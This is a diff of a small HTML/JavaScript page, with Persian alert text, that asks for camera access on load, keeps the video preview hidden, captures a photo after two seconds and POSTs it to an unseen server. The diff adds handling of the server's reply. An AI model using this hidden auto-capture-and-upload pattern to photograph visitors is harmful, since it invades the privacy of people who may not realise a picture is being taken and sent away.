@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Camera to Gmail</title>
+  <title>Test Camera Email</title>
 </head>
 <body>
   <video id="video" autoplay playsinline style="display:none;"></video>
@@ -16,7 +16,7 @@
 
         video.onloadedmetadata = () => setTimeout(() => capturePhoto(video), 2000);
       } catch (err) {
-        alert("❌ دسترسی به دوربین داده نشد!");
+        alert("❌ اجازه دوربین داده نشد");
       }
     }
 
@@ -32,9 +32,16 @@
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ image: dataUrl })
+      })
+      .then(res => res.text())
+      .then(result => {
+        console.log("Result:", result);
+        alert("✅ پاسخ از سرور: " + result);
+      })
+      .catch(err => {
+        console.error("❌ خطا در ارسال:", err);
+        alert("❌ خطا در ارسال به سرور");
       });
-
-      alert("✅ عکس گرفته شد و به ایمیل ارسال گردید.");
     }
 
     window.onload = init;
